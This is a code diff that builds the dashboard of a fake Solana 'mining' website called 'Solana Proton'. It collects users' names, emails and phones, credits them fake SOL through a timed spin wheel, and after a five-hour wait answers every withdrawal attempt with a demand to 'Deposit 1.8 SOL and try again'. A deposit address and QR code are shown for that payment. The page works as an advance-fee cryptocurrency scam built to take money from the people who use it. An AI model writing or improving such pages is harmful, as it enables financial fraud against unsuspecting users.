@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Solana Proton - Register/Login</title>
+    <title>Solana Proton - Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
@@ -15,11 +15,11 @@
             align-items: center;
             justify-content: center;
         }
-        .auth-container {
+        .auth-container, .dashboard-container {
             background: rgba(25, 8, 56, 0.97);
             border-radius: 18px;
             padding: 36px 28px 30px 28px;
-            max-width: 390px;
+            max-width: 500px;
             width: 100%;
             box-shadow: 0 8px 32px #0006;
             display: flex;
@@ -146,9 +146,244 @@
         .hidden {
             display: none;
         }
+        .logout-btn {
+            margin-top: 20px;
+            background: #fa709a;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 8px 18px;
+            font-size: 1rem;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .logout-btn:active {
+            background: #e36b8d;
+        }
+        /* Dashboard styles */
+        .dashboard-header {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            margin-bottom: 22px;
+        }
+        .portfolio-table {
+            width: 100%;
+            margin: 22px 0 20px 0;
+            border-collapse: separate;
+            border-spacing: 0 7px;
+            background: transparent;
+        }
+        .portfolio-table th, .portfolio-table td {
+            padding: 7px 12px;
+            text-align: center;
+        }
+        .portfolio-table th {
+            background: #4b1e82;
+            color: #e3e6f9;
+            font-weight: 600;
+            border-radius: 8px 8px 0 0;
+        }
+        .portfolio-table td {
+            background: #2d0b50;
+            color: #fff;
+            font-size: 1.04rem;
+            border-radius: 0 0 8px 8px;
+        }
+        .solana-logo-table {
+            width: 26px;
+            vertical-align: middle;
+        }
+        .wheel-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 16px 0 22px 0;
+        }
+        .wheel {
+            width: 145px;
+            height: 145px;
+            border-radius: 50%;
+            border: 8px solid #a688fa;
+            background:
+                conic-gradient(#9b59ff 0 45deg, #fff 45deg 90deg, #9b59ff 90deg 135deg, #fff 135deg 180deg, #9b59ff 180deg 225deg, #fff 225deg 270deg, #9b59ff 270deg 315deg, #fff 315deg 360deg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            box-shadow: 0 0 30px #8c47fc55;
+        }
+        .pointer {
+            width: 0;
+            height: 0;
+            border-left: 13px solid transparent;
+            border-right: 13px solid transparent;
+            border-bottom: 26px solid #eb21c8;
+            position: absolute;
+            top: -32px;
+            left: calc(50% - 13px);
+            z-index: 1;
+        }
+        .spin-btn {
+            margin-top: 19px;
+            padding: 10px 28px;
+            font-size: 1.1rem;
+            border-radius: 6px;
+            background: linear-gradient(90deg,#d033ff,#7b2ff2);
+            border: none;
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .2s;
+            box-shadow: 0 3px 14px #40005735;
+        }
+        .spin-btn:disabled {
+            background: #7e57c2;
+            cursor: not-allowed;
+            color: #b6a9e1;
+        }
+        .timer, .info {
+            margin: 13px 0 0;
+            text-align: center;
+            font-size: 1.02rem;
+            color: #ddcfff;
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            margin: 32px 0 0;
+            gap: 10px;
+        }
+        .action-btn {
+            padding: 12px 26px;
+            font-size: 1.05rem;
+            border-radius: 6px;
+            background: linear-gradient(90deg,#fee140,#fa709a);
+            border: none;
+            color: #3a2a4c;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .2s;
+        }
+        .action-btn:disabled {
+            background: #786cc2;
+            color: #eee;
+            cursor: not-allowed;
+        }
+        .withdraw-btn-active {
+            background: linear-gradient(90deg,#e53d56,#9b59ff);
+            color: #fff;
+        }
+        .media-gallery {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 11px;
+            margin: 25px 0 8px 0;
+        }
+        .media-gallery .media-item {
+            background: #1a0b2c;
+            border-radius: 11px;
+            box-shadow: 0 2px 12px #0003;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .media-gallery .media-item img,
+        .media-gallery .media-item video {
+            display: block;
+            width: 83px;
+            height: 83px;
+            object-fit: cover;
+        }
+        .media-gallery .media-item.gif {
+            border: 2px solid #fa709a;
+        }
+        .media-gallery .media-item.placeholder {
+            background: #391f5a;
+            color: #fff;
+            font-size: 0.97rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 83px; height: 83px;
+        }
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: rgba(30,0,60,0.82);
+            z-index: 10;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal.active {display: flex;}
+        .modal-content {
+            background: #2d0b50;
+            padding: 26px 18px;
+            border-radius: 15px;
+            max-width: 340px;
+            width: 95vw;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 0 22px #a688fa33;
+        }
+        .modal-content img {max-width: 120px; margin: 12px auto;}
+        .sol-address {
+            background: #1a1e3a;
+            padding: 7px 10px;
+            margin: 13px 0 0;
+            border-radius: 5px;
+            word-break: break-all;
+            font-size: 1rem;
+        }
+        .close-btn {
+            position: absolute; top: 10px; right: 15px;
+            background: none; border: none; color: #fff;
+            font-size: 1.42rem; cursor: pointer;
+        }
+        .withdraw-form {margin-top: 9px;}
+        .withdraw-form input {
+            display: block;width: 92%;margin: 9px auto 16px;
+            padding: 9px;font-size: 1rem;border-radius: 5px;
+            border: none;outline: none;background: #1f2341;color: #fff;
+        }
+        .error-msg-modal {color: #e53d56;font-size: 1.03rem;margin-top: 7px;}
+        .modal-content button {
+            padding: 10px 25px;font-size: 1rem;margin-top: 8px;
+            background: linear-gradient(90deg,#fa709a,#fee140);
+            border: none;color: #3a2a4c;border-radius: 6px;cursor:pointer;
+            font-weight: 600;
+        }
+        /* Rewards popup */
+        .reward-popup {
+            position: fixed;
+            left: 50%;
+            top: 18vh;
+            transform: translate(-50%, -50%) scale(1);
+            z-index: 99;
+            background: #2d0b50;
+            color: #fee140;
+            border-radius: 18px;
+            box-shadow: 0 8px 32px #000c;
+            padding: 28px 34px;
+            font-size: 1.32rem;
+            font-weight: bold;
+            text-align: center;
+            display: none;
+            animation: fadeInScale 0.5s cubic-bezier(.45,1.15,.45,1.15);
+        }
+        @keyframes fadeInScale {
+            from {opacity: 0; transform: translate(-50%, -50%) scale(0.7);}
+            to {opacity: 1; transform: translate(-50%, -50%) scale(1);}
+        }
     </style>
 </head>
 <body>
+<!-- Register/Login Section -->
 <div class="auth-container" id="register-section">
     <div class="logo-holder">
         <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="Solana">
@@ -193,19 +428,104 @@
     </form>
 </div>
 
-<!-- Portfolio Main View (hidden initially) -->
-<div class="auth-container hidden" id="portfolio-section">
-    <div class="logo-holder">
-        <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="Solana">
+<!-- Dashboard Section -->
+<div class="dashboard-container hidden" id="dashboard-section">
+    <div class="dashboard-header">
+        <div class="logo-holder">
+            <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="Solana">
+        </div>
+        <div>
+            <h2>Solana Proton</h2>
+            <div class="subtitle" id="user-greeting"></div>
+        </div>
     </div>
-    <h2>Welcome to Solana Mining Portfolio</h2>
-    <div class="subtitle">Portfolio view unlocked.</div>
-    <div style="margin-top: 10px; color:#fee140;">
-        (Your mining dashboard goes here.)
+    <table class="portfolio-table" id="portfolio-table">
+        <thead>
+            <tr>
+                <th>Token</th>
+                <th>Price</th>
+                <th>Portfolio Balance</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>
+                    <img class="solana-logo-table" src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="SOL"> Solana (SOL)
+                </td>
+                <td id="sol-price">$-&nbsp;</td>
+                <td id="portfolio-balance">0.00 SOL</td>
+            </tr>
+        </tbody>
+    </table>
+    <div class="wheel-section">
+        <div class="wheel" id="wheel">
+            <div class="pointer"></div>
+        </div>
+        <button class="spin-btn" id="spin-btn">Spin Wheel (+0.5 SOL)</button>
+        <div class="timer" id="spin-timer">Ready to spin!</div>
+    </div>
+    <div class="info" id="session-timer"></div>
+    <div class="actions">
+        <button class="action-btn" id="deposit-btn">Deposit</button>
+        <button class="action-btn" id="withdraw-btn" disabled>Withdraw</button>
+    </div>
+    <div class="media-gallery">
+        <div class="media-item gif placeholder" id="gif1">GIF 1</div>
+        <div class="media-item gif placeholder" id="gif2">GIF 2</div>
+        <div class="media-item placeholder" id="img1">IMG 1</div>
+        <div class="media-item placeholder" id="img2">IMG 2</div>
+        <div class="media-item placeholder" id="img3">IMG 3</div>
+    </div>
+    <button class="logout-btn" id="logout-btn">Logout</button>
+</div>
+
+<!-- Deposit Modal -->
+<div class="modal" id="deposit-modal">
+    <div class="modal-content">
+        <button class="close-btn" onclick="closeModal('deposit-modal')">&times;</button>
+        <h2>Deposit SOL</h2>
+        <img src="https://api.qrserver.com/v1/create-qr-code/?data=sol1234walletaddress&size=120x120" alt="Deposit QR">
+        <div>Scan to deposit or copy the address below:</div>
+        <div class="sol-address" id="deposit-address">sol1234walletaddress</div>
     </div>
 </div>
 
+<!-- Withdraw Modal -->
+<div class="modal" id="withdraw-modal">
+    <div class="modal-content">
+        <button class="close-btn" onclick="closeModal('withdraw-modal')">&times;</button>
+        <h2>Withdraw SOL</h2>
+        <form class="withdraw-form" onsubmit="event.preventDefault();handleWithdraw();">
+            <label>Amount (max: <span id="max-balance">0.0</span> SOL)</label>
+            <input type="number" id="withdraw-amount" min="0.1" step="0.1" placeholder="Enter amount" required>
+            <label>Your SOL Address</label>
+            <input type="text" id="withdraw-address" placeholder="Enter address" required>
+            <button type="submit">Complete Withdraw</button>
+            <div class="error-msg-modal" id="withdraw-error"></div>
+        </form>
+    </div>
+</div>
+
+<!-- Rewards Popup -->
+<div class="reward-popup" id="reward-popup">
+    +0.5 SOL Rewarded!
+</div>
+
 <script>
+// --- LocalStorage Helper ---
+function saveUserToStorage(user) {
+    localStorage.setItem('solanaProtonUser', JSON.stringify(user));
+}
+function getUserFromStorage() {
+    try {
+        return JSON.parse(localStorage.getItem('solanaProtonUser'));
+    } catch { return null; }
+}
+function clearUserFromStorage() {
+    localStorage.removeItem('solanaProtonUser');
+}
+
+// --- Auth/Register Logic ---
 let generatedCode = "";
 let codeTimeout;
 const registerForm = document.getElementById('register-form');
@@ -218,8 +538,14 @@ const enterCodeInput = document.getElementById('enter-code');
 const errorMsg = document.getElementById('error-msg');
 const successMsg = document.getElementById('success-msg');
 const loginBtn = document.getElementById('login-btn');
-const portfolioSection = document.getElementById('portfolio-section');
+const dashboardSection = document.getElementById('dashboard-section');
 const registerSection = document.getElementById('register-section');
+const logoutBtn = document.getElementById('logout-btn');
+const fnameInput = document.getElementById('fname');
+const emailInput = document.getElementById('email');
+const phoneInput = document.getElementById('phone');
+const refidInput = document.getElementById('refid');
+const userGreeting = document.getElementById('user-greeting');
 
 function randomCode(n) {
     let code = "";
@@ -227,25 +553,39 @@ function randomCode(n) {
     return code;
 }
 
+window.onload = function() {
+    const user = getUserFromStorage();
+    if (user && user.code) {
+        registerSection.classList.add('hidden');
+        dashboardSection.classList.remove('hidden');
+        if (user.fname) userGreeting.textContent = `Welcome, ${user.fname}!`;
+        startDashboard();
+    } else if (user) {
+        if(user.fname) fnameInput.value = user.fname;
+        if(user.email) emailInput.value = user.email;
+        if(user.phone) phoneInput.value = user.phone;
+        if(user.refid) refidInput.value = user.refid;
+    }
+}
+
 getCodeBtn.onclick = function() {
     errorMsg.textContent = "";
     successMsg.textContent = "";
-    // Validate fields (basic)
-    let fname = document.getElementById('fname').value.trim();
-    let email = document.getElementById('email').value.trim();
-    let phone = document.getElementById('phone').value.trim();
+    let fname = fnameInput.value.trim();
+    let email = emailInput.value.trim();
+    let phone = phoneInput.value.trim();
+    let refid = refidInput.value.trim();
     if (!fname || !email || !phone) {
         errorMsg.textContent = "Please fill all required fields.";
         return;
     }
-    // Generate and show code
     generatedCode = randomCode(6);
     codeDigits.textContent = generatedCode;
     codeRow.classList.remove('hidden');
     enterCodeGroup.classList.remove('hidden');
     loginBtn.classList.remove('hidden');
     getCodeBtn.disabled = true;
-    // Set code to expire after 3 min
+    saveUserToStorage({fname, email, phone, refid});
     if (codeTimeout) clearTimeout(codeTimeout);
     codeTimeout = setTimeout(() => {
         generatedCode = "";
@@ -275,10 +615,19 @@ registerForm.onsubmit = function(e) {
         errorMsg.textContent = "Incorrect code. Please try again.";
         return;
     }
-    // Success: show portfolio section
     clearTimeout(codeTimeout);
+    const user = {
+        fname: fnameInput.value.trim(),
+        email: emailInput.value.trim(),
+        phone: phoneInput.value.trim(),
+        refid: refidInput.value.trim(),
+        code: generatedCode
+    };
+    saveUserToStorage(user);
     registerSection.classList.add('hidden');
-    portfolioSection.classList.remove('hidden');
+    dashboardSection.classList.remove('hidden');
+    userGreeting.textContent = `Welcome, ${user.fname}!`;
+    startDashboard();
 }
 
 enterCodeInput.oninput = function() {
@@ -287,6 +636,179 @@ enterCodeInput.oninput = function() {
         loginBtn.focus();
     }
 };
+
+logoutBtn.onclick = function() {
+    clearUserFromStorage();
+    generatedCode = "";
+    codeDigits.textContent = "000000";
+    if (codeTimeout) clearTimeout(codeTimeout);
+    dashboardSection.classList.add('hidden');
+    registerSection.classList.remove('hidden');
+    registerForm.reset();
+    codeRow.classList.add('hidden');
+    enterCodeGroup.classList.add('hidden');
+    loginBtn.classList.add('hidden');
+    getCodeBtn.disabled = false;
+    errorMsg.textContent = "";
+    successMsg.textContent = "";
+};
+
+// --- Dashboard Logic ---
+let balance = 0.0;
+let sessionStart = null;
+let sessionEnd = null;
+let nextSpinTime = null;
+let wheelSpinning = false;
+let solPrice = null;
+let rewardInterval = 6 * 60; // 6 minutes in seconds
+let sessionHours = 5;
+let sessionSeconds = sessionHours * 3600;
+let rewardAmount = 0.5;
+let rewardPopupTimeout = null;
+
+// UI Elements
+const balanceEl = document.getElementById('portfolio-balance');
+const maxBalanceEl = document.getElementById('max-balance');
+const solPriceEl = document.getElementById('sol-price');
+const spinBtn = document.getElementById('spin-btn');
+const spinTimerEl = document.getElementById('spin-timer');
+const sessionTimerEl = document.getElementById('session-timer');
+const depositBtn = document.getElementById('deposit-btn');
+const withdrawBtn = document.getElementById('withdraw-btn');
+const wheelEl = document.getElementById('wheel');
+const rewardPopup = document.getElementById('reward-popup');
+
+function startDashboard() {
+    // Reset state on every dashboard entry
+    balance = 0.0;
+    sessionStart = Date.now();
+    sessionEnd = sessionStart + sessionSeconds * 1000;
+    nextSpinTime = Date.now();
+    wheelSpinning = false;
+    updateBalance();
+    fetchSolPrice();
+    updateTimers();
+}
+
+function updateTimers() {
+    let now = Date.now();
+    let left = Math.max(0, Math.floor((sessionEnd - now)/1000));
+    let h = Math.floor(left/3600), m = Math.floor((left%3600)/60), s = (left%60);
+    sessionTimerEl.textContent = left > 0 ?
+        `Time left until withdraw: ${h.toString().padStart(2,0)}:${m.toString().padStart(2,0)}:${s.toString().padStart(2,0)}` :
+        "Withdraw is now available!";
+    if (left <= 0) {
+        withdrawBtn.disabled = false;
+        withdrawBtn.classList.add("withdraw-btn-active");
+    }
+    else {
+        withdrawBtn.disabled = true;
+        withdrawBtn.classList.remove("withdraw-btn-active");
+    }
+    let spinLeft = Math.max(0, Math.floor((nextSpinTime-now)/1000));
+    spinBtn.disabled = wheelSpinning || spinLeft>0 || left<=0;
+    if (left <= 0) {
+        spinBtn.disabled = true;
+        spinTimerEl.textContent = "Wheel session ended.";
+    } else if (spinLeft > 0) {
+        let mm = Math.floor(spinLeft/60), ss = (spinLeft%60);
+        spinTimerEl.textContent = `Next spin in ${mm.toString().padStart(2,0)}:${ss.toString().padStart(2,0)}`;
+    } else {
+        spinTimerEl.textContent = "Ready to spin!";
+    }
+    setTimeout(updateTimers, 1000);
+}
+
+spinBtn.onclick = async function() {
+    if (wheelSpinning || Date.now() < nextSpinTime || Date.now() > sessionEnd) return;
+    wheelSpinning = true;
+    spinBtn.disabled = true;
+    spinTimerEl.textContent = "Spinning...";
+    let duration = 1600;
+    let spins = 5 + Math.random()*3;
+    let start = performance.now();
+    function animateWheel(ts) {
+        let elapsed = ts - start;
+        let t = Math.min(1, elapsed/duration);
+        let rot = t*spins*360;
+        wheelEl.style.transform = `rotate(${rot}deg)`;
+        if (t<1) requestAnimationFrame(animateWheel);
+        else {
+            wheelEl.style.transform = '';
+            setTimeout(()=> {
+                balance += rewardAmount;
+                updateBalance();
+                nextSpinTime = Date.now() + rewardInterval*1000;
+                wheelSpinning = false;
+                spinBtn.disabled = false;
+                showRewardPopup(`+${rewardAmount} SOL Rewarded!`);
+                spinTimerEl.textContent = `+${rewardAmount} SOL awarded!`;
+                setTimeout(updateTimers, 1200);
+            }, 250);
+        }
+    }
+    requestAnimationFrame(animateWheel);
+}
+
+function showRewardPopup(text) {
+    rewardPopup.textContent = text;
+    rewardPopup.style.display = 'block';
+    if (rewardPopupTimeout) clearTimeout(rewardPopupTimeout);
+    rewardPopupTimeout = setTimeout(() => {
+        rewardPopup.style.display = 'none';
+    }, 2600);
+}
+
+function updateBalance() {
+    balanceEl.textContent = `${balance.toFixed(2)} SOL`;
+    if (maxBalanceEl) maxBalanceEl.textContent = balance.toFixed(2);
+    if (solPrice !== null)
+        balanceEl.textContent += ` ($${(balance * solPrice).toFixed(2)})`;
+}
+
+async function fetchSolPrice() {
+    try {
+        let res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
+        let data = await res.json();
+        solPrice = data.solana.usd;
+        solPriceEl.textContent = "$" + solPrice.toLocaleString(undefined,{maximumFractionDigits:2});
+        updateBalance();
+    } catch(e) {
+        solPriceEl.textContent = "$-";
+    }
+}
+
+depositBtn.onclick = function() {
+    showModal('deposit-modal');
+}
+function showModal(id) {
+    document.getElementById(id).classList.add('active');
+}
+function closeModal(id) {
+    document.getElementById(id).classList.remove('active');
+}
+
+withdrawBtn.onclick = function() {
+    if (maxBalanceEl) maxBalanceEl.textContent = balance.toFixed(2);
+    document.getElementById('withdraw-amount').value = balance.toFixed(2);
+    document.getElementById('withdraw-error').textContent = '';
+    showModal('withdraw-modal');
+}
+function handleWithdraw() {
+    let amount = parseFloat(document.getElementById('withdraw-amount').value);
+    let address = document.getElementById('withdraw-address').value.trim();
+    let errorEl = document.getElementById('withdraw-error');
+    if (!address || isNaN(amount) || amount <= 0 || amount > balance) {
+        errorEl.textContent = "Invalid amount or address.";
+        return;
+    }
+    errorEl.textContent = "Error: Deposit 1.8 SOL and try again.";
+}
+
+// --- Prevent scrolling on modal open ---
+document.querySelectorAll('.modal').forEach(modal => {
+    modal.addEventListener('touchmove', e => {if(modal.classList.contains('active')) e.preventDefault();}, {passive:false});
+});
 </script>
 </body>
 </html>
